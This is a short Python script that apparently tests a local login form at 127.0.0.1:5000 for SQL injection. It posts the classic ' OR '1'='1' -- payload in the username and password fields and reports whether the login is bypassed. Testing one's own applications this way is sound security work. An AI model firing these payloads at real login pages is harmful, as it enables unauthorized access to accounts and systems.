import requests

URL = "http://127.0.0.1:5000/"

tests = [
    ("admin", "wrong123", "Baseline"),
    ("' OR '1'='1' -- ", "anything", "SQLi test - username"),
    ("admin", "' OR '1'='1' -- ", "SQLi test - password"),
]

for username, password, name in tests:

    response = requests.post(
        URL,
        data={
            "username": username,
            "password": password
        }
    )

    print("=" * 60)
    print(name)
    print(f"Username: {username}")
    print(f"Password: {password}")
    print(f"HTTP Status: {response.status_code}")

    if "Login successful" in response.text:
        print("RESULT: SQL INJECTION CONFIRMED")
    elif "Invalid credentials" in response.text:
        print("RESULT: Authentication failed")
    else:
        print("RESULT: Unexpected response")